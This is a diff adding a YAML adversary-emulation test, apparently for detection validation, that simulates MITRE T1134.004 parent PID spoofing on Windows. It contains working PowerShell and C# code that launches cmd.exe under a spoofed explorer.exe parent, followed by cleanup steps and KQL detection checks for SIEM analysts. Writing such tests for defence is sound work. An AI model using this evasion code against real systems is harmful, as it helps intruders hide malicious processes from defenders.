@@ -1,0 +1,162 @@
+id: T1134.004_parent_pid_spoofing
+name: "Access Token Manipulation — Parent PID Spoofing"
+mitre_technique: "T1134.004"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries specify a fake parent process when calling CreateProcess by supplying
+  a PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute. This causes the new process to
+  appear as a child of a trusted process (e.g. explorer.exe, svchost.exe) in process
+  tree views and detections that rely on parent-child relationships.
+  Detection relies on comparing the process lineage recorded by the kernel (real parent)
+  vs the spoofed PPID visible in userland, and on detecting anomalous parent-child pairs.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1134/004/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1134.004 — Parent PID Spoofing simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Identify a suitable spoofed parent (explorer.exe) PID"
+    command: |
+      $explorer = Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1
+      if ($explorer) {
+          Write-Host "[PAS] Spoofing target (explorer.exe) PID: $($explorer.Id)"
+          $explorer.Id | Out-File "$env:TEMP\PAS_T1134_004_parentpid.txt"
+      } else {
+          Write-Host "[PAS] explorer.exe not found — using winlogon as fallback"
+          $wb = Get-Process winlogon | Select-Object -First 1
+          $wb.Id | Out-File "$env:TEMP\PAS_T1134_004_parentpid.txt"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Spawn cmd.exe with spoofed PPID pointing to explorer.exe using UpdateProcThreadAttribute"
+    command: |
+      Add-Type @"
+      using System;
+      using System.Runtime.InteropServices;
+      public class PASPPIDSpoof {
+          [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+          [DllImport("kernel32.dll")] public static extern bool InitializeProcThreadAttributeList(
+              IntPtr list, int count, int flags, ref IntPtr size);
+          [DllImport("kernel32.dll")] public static extern bool UpdateProcThreadAttribute(
+              IntPtr list, uint flags, IntPtr attr, IntPtr val, IntPtr size, IntPtr prev, IntPtr ret);
+          [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
+          public static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta,
+              bool inherit, uint flags, IntPtr env, string dir, ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
+          [DllImport("kernel32.dll")] public static extern bool TerminateProcess(IntPtr h, uint c);
+          [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
+          [DllImport("kernel32.dll")] public static extern void DeleteProcThreadAttributeList(IntPtr list);
+
+          [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+          public struct STARTUPINFOEX {
+              public STARTUPINFO StartupInfo;
+              public IntPtr lpAttributeList;
+          }
+          [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+          public struct STARTUPINFO {
+              public int cb; public string lpReserved; public string lpDesktop;
+              public string lpTitle; public int dwX; public int dwY; public int dwXSize;
+              public int dwYSize; public int dwXCountChars; public int dwYCountChars;
+              public int dwFillAttribute; public int dwFlags; public short wShowWindow;
+              public short cbReserved2; public IntPtr lpReserved2;
+              public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
+          }
+          [StructLayout(LayoutKind.Sequential)]
+          public struct PROCESS_INFORMATION {
+              public IntPtr hProcess; public IntPtr hThread;
+              public int dwProcessId; public int dwThreadId;
+          }
+      }
+"@
+      $parentPidFile = "$env:TEMP\PAS_T1134_004_parentpid.txt"
+      $parentPid = [int](Get-Content $parentPidFile)
+      Write-Host "[PAS] Spoofing PPID to: $parentPid (explorer.exe)"
+
+      $PROCESS_ALL_ACCESS    = 0x1F0FFF
+      $EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+      $CREATE_NO_WINDOW      = 0x08000000
+      $PROC_THREAD_ATTR_PARENT = [IntPtr]0x00020000
+
+      $hParent = [PASPPIDSpoof]::OpenProcess($PROCESS_ALL_ACCESS, $false, $parentPid)
+      Write-Host "[PAS] OpenProcess(explorer.exe): handle $hParent"
+
+      if ($hParent -ne [IntPtr]::Zero) {
+          # Initialize attribute list
+          $size = [IntPtr]::Zero
+          [PASPPIDSpoof]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$size) | Out-Null
+          $attrList = [Runtime.InteropServices.Marshal]::AllocHGlobal($size)
+          [PASPPIDSpoof]::InitializeProcThreadAttributeList($attrList, 1, 0, [ref]$size) | Out-Null
+
+          # Allocate parent handle value
+          $parentHandle = [Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
+          [Runtime.InteropServices.Marshal]::WriteIntPtr($parentHandle, $hParent)
+
+          [PASPPIDSpoof]::UpdateProcThreadAttribute(
+              $attrList, 0, $PROC_THREAD_ATTR_PARENT,
+              $parentHandle, [IntPtr]([IntPtr]::Size), [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
+
+          $si = New-Object PASPPIDSpoof+STARTUPINFOEX
+          $si.StartupInfo.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
+          $si.lpAttributeList = $attrList
+          $pi = New-Object PASPPIDSpoof+PROCESS_INFORMATION
+
+          $cmdLine = "cmd.exe /c echo PAS-T1134.004-PPID-SPOOFED"
+          $created = [PASPPIDSpoof]::CreateProcess(
+              $null, $cmdLine, [IntPtr]::Zero, [IntPtr]::Zero, $false,
+              ($EXTENDED_STARTUPINFO_PRESENT -bor $CREATE_NO_WINDOW),
+              [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
+
+          Write-Host "[PAS] CreateProcess with spoofed PPID: $created — child PID: $($pi.dwProcessId)"
+          Write-Host "[PAS] Process tree will show cmd.exe as child of explorer.exe (PID $parentPid)"
+
+          if ($pi.hProcess -ne [IntPtr]::Zero) {
+              Start-Sleep -Milliseconds 500
+              [PASPPIDSpoof]::TerminateProcess($pi.hProcess, 0) | Out-Null
+              [PASPPIDSpoof]::CloseHandle($pi.hProcess) | Out-Null
+              [PASPPIDSpoof]::CloseHandle($pi.hThread) | Out-Null
+          }
+          [PASPPIDSpoof]::DeleteProcThreadAttributeList($attrList)
+          [Runtime.InteropServices.Marshal]::FreeHGlobal($attrList)
+          [Runtime.InteropServices.Marshal]::FreeHGlobal($parentHandle)
+          [PASPPIDSpoof]::CloseHandle($hParent) | Out-Null
+      }
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 5
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — cmd.exe should appear as child of explorer.exe in process tree despite being launched from powershell.exe"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove temp PID file"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1134_004_parentpid.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Temp file removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1134.004 cleanup complete"
+
+analyst_checklist:
+  - "CRITICAL: cmd.exe appearing as child of explorer.exe with no user interaction is anomalous"
+  - "MDE stores the real calling process — compare InitiatingProcessId vs ParentProcessId in telemetry"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'cmd.exe' and InitiatingProcessFileName == 'explorer.exe' and InitiatingProcessCommandLine == '' — no real user cmd"
+  - "Sentinel: DeviceProcessEvents — check if ParentProcessId in event matches actual parent recorded by kernel"
+  - "MDE alert: 'Parent process ID spoofing' or 'Suspicious child process of explorer.exe'"
+  - "CONTROL CHECK: MDE records both the spoofed PPID (visible in process tree) and the true initiating process — verify your KQL uses InitiatingProcessFileName not ParentProcessName"
+  - "CONTROL CHECK: Alert on cmd.exe, powershell.exe, or wscript.exe appearing as direct children of explorer.exe without corresponding user desktop interaction"
